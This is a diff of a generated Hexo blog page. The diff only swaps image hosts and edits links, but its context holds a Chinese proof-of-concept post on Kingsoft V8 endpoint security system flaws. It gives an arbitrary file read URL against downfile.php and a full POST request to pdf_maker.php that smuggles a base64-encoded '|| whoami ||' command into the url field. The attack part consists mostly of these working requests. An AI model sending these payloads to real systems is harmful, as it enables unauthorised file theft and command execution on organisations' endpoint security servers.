@@ -241,7 +241,7 @@
       </div>
     </header>
     <main class="post-main" itemprop="articleBody">
-      <script src="\assets\js\APlayer.min.js"> </script><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/12849280/1626104393184-ad5dc533-507b-4ebd-8024-fef2759d03fc.jpeg"></p>
+      <script src="\assets\js\APlayer.min.js"> </script><p><img src="https://z3.ax1x.com/2021/07/13/WFHmrV.jpg"></p>
 <a id="more"></a>
 
 <h3 id="金山-V8-終端安全系统任意文件读取漏洞"><a href="#金山-V8-終端安全系统任意文件读取漏洞" class="headerlink" title="金山 V8 終端安全系统任意文件读取漏洞"></a>金山 V8 終端安全系统任意文件读取漏洞</h3><p>FOFA</p>
@@ -249,9 +249,9 @@
 <p>POC</p>
 <figure class="hljs highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xxx.xxx.xxx.xxx<span class="hljs-regexp">/htmltopdf/</span>downfile.php?filename=downfile.php<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994716564-f8099917-4226-472f-9be2-b51b9c871f55.png" alt="img"></p>
+<p><img src="https://z3.ax1x.com/2021/07/13/WFHozn.png" alt="img"></p>
 <h3 id="金山V8-终端安全系统命令执行漏洞"><a href="#金山V8-终端安全系统命令执行漏洞" class="headerlink" title="金山V8 终端安全系统命令执行漏洞"></a>金山V8 终端安全系统命令执行漏洞</h3><p>​    原文：<a href="https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA</a></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994716647-14948227-f4de-4dfb-8669-3e595dc21218.png" alt="img"></p>
+<p><img src="https://z3.ax1x.com/2021/07/13/WFH7Mq.png" alt="img"></p>
 <p>漏洞位置：</p>
 <p><code>http://xxx.xxx.xxx.xxx//inter/pdf_maker.php</code></p>
 <p>FOFA</p>
@@ -259,12 +259,12 @@
 <p>验证</p>
 <p><a href="http://x.x.x.x/inter/pdf_maker.php" target="_blank" rel="noopener">http://x.x.x.x/inter/pdf_maker.php</a></p>
 <p>url值为经过base64编码后的 <code>&quot;|| whoami ||</code></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994716745-995393a7-6b4c-4342-af5c-7084af3ef8b5.png" alt="img"></p>
+<p><img src="https://z3.ax1x.com/2021/07/13/WFH5Gj.png" alt="img"></p>
 <p>请求包如下：</p>
 <figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">POST &#x2F;inter&#x2F;pdf_maker.php HTTP&#x2F;1.1<br>Host: x.x.x.x.x<br>User-Agent: Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:87.0; en_US) Gecko&#x2F;20100101 Firefox&#x2F;87.0<br>Accept: image&#x2F;webp,*&#x2F;*<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>DNT: 1<br>Connection: close<br>Cookie: PHPSESSID&#x3D;ic3v6dkhmff0ljn7pgusad43s0<br>X-Forwarded-For: 110.110.110.110<br>X-Originating-IP: 110.110.110.110<br>X-Remote-IP: 110.110.110.110<br>X-Remote-Addr: 110.110.110.110<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 39<br><br>url&#x3D;Inx8IHdob2FtaSB8fA&#x3D;&#x3D;&amp;fileName&#x3D;xxx<br></code></pre></td></tr></table></figure>
 
 <p>看看连接情况：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994716818-1969b15a-8c76-4b75-9200-35346c245f0c.png" alt="img"></p>
+<p><img src="https://z3.ax1x.com/2021/07/13/WFHIRs.png" alt="img"></p>
 <p><strong>Reference</strong></p>
 <p><a href="https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA</a></p>
 <p><a href="https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20pdf_maker.php%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener">https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20pdf_maker.php%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md</a></p>
@@ -330,7 +330,7 @@
     </div>
     <div class="page-nav-prev page-nav-item">
       
-      <a href="/posts/43bd18b.html" rel="next" title="锐捷NBR路由器RCE"><span class="nav-title">锐捷NBR路由器RCE</span><i class="fas fa-angle-right"></i></a>
+      <a href="/posts/43bd18b.html" rel="next" title="Ruijie-NBR-router-RCE"><span class="nav-title">Ruijie-NBR-router-RCE</span><i class="fas fa-angle-right"></i></a>
       
     </div>
   </nav>
@@ -488,7 +488,7 @@
           
         </div>
         <div class="powered-by">
-          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://alynx.xyz/" target="_blank">AlynxZhou</a> <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://alynx.one/" target="_blank">AlynxZhou</a> <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
         </div>
       </div>
     </div>
